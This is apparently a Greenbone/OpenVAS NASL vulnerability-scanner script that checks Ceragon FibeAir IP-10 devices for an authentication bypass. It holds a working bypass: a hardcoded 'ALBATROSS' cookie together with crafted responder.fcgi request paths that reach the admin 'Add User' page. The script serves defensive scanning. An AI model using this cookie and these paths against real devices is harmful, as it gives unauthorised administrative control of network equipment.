# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106103");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-06-21 11:09:47 +0700 (Tue, 21 Jun 2016)");
  script_tag(name:"cvss_base", value:"9.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Ceragon IP-10 Authentication Bypass Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Ceragon IP-10 is prone to an authentication bypass vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Ceragon FibeAir IP-10 devices do not properly ensure that a user
  has authenticated before granting them access to the web interface of the device.");

  script_tag(name:"impact", value:"A remote attacker may gain administrative access to the web UI.");

  script_tag(name:"affected", value:"Version prior to 7.2.0.");

  script_tag(name:"solution", value:"Upgrade to Version 7.2.0 or later");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Jun/34");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

res = http_get_cache(port: port, item: "/");

if ("Web Management" >< res && "./responder.fcgi" >< res) {
  cookie = "ALBATROSS=0-4-11";

  urls = make_list('/responder.fcgi1?winid=106&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi1?winid=109&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi1?winid=103&winname=Users%20%26%20Groups&slot=1&mainslot=1',
                   '/responder.fcgi0?winid=89&winname=Users%20%26%20Groups&slot=0');

  foreach url (urls) {
    if (http_vuln_check(port: port, url: url, pattern: "Add User", check_header: TRUE,
                        extra_check: "System up time", cookie: cookie)) {
      security_message(port: port);
      exit(0);
    }
  }
}

exit(0);
